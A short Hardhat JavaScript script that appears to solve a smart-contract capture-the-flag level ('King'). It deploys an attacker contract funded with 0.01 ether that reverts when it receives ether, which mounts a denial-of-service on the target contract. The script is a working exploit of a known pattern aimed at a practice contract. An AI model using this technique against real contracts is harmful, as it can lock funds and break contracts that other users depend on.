const { ethers } = require("hardhat");

const KING_CONTRACT_NAME = "King";
const KING_CONTRACT_ADDRESS = "0xe65f8456C586e7e835B97EEFca3468D171837FAe";
const ATTACKER_KING_CONTRACT_NAME = "King_Attacker";

async function main() {
    const kingFactory = await ethers.getContractFactory(KING_CONTRACT_NAME);
    const kingContract = kingFactory.attach(KING_CONTRACT_ADDRESS);
    console.log("Attached King Contract to Factory");

    const etherToSend = ethers.parseEther("0.01");

    console.log("Performing Denial of Service Attack by Deploying a Contract that Reverts when Receving Ether");
    
    const attackerFactory = await ethers.getContractFactory(ATTACKER_KING_CONTRACT_NAME);
    const attacerKingContract = await attackerFactory.deploy(KING_CONTRACT_ADDRESS, { value: etherToSend });
    await attacerKingContract.waitForDeployment();

    console.log("Success, now submit the Instance and Move to Next level");
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})